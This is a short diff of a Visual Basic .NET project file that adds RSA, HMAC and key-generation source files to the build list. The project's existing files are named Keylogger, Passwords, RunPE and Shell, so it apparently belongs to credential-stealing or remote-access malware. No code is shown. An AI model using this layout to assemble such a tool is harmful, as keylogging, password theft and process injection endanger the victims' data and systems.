@@ -69,7 +69,11 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Crypt\AES.vb" />
+    <Compile Include="Crypt\HMACSHA512Hasher.vb" />
+    <Compile Include="Crypt\RandomKeyGenerator.vb" />
     <Compile Include="Crypt\RC4.vb" />
+    <Compile Include="Crypt\RSA.vb" />
+    <Compile Include="Crypt\RSAresult.vb" />
     <Compile Include="Functions.vb" />
     <Compile Include="Keylogger.vb" />
     <Compile Include="Main.Designer.vb">
@@ -93,6 +97,7 @@
       <DependentUpon>Settings.settings</DependentUpon>
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
+    <Compile Include="Names.vb" />
     <Compile Include="Passwords.vb" />
     <Compile Include="RunPE.vb" />
     <Compile Include="Shell.vb" />
